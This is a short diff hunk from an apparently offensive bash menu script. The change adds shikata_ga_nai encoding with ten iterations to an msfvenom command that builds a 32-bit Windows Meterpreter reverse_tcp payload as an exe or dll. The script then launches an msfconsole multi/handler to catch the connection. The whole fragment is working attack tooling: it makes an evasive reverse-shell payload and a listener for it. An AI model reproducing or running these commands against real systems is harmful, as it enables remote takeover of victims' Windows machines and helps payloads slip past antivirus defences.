@@ -10308,7 +10308,7 @@ while true; do
 			then
 				select EXT in "exe" "dll"
 				do
-					msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
+					msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e x86/shikata_ga_nai -i 10 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
 					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
 					break
 				done
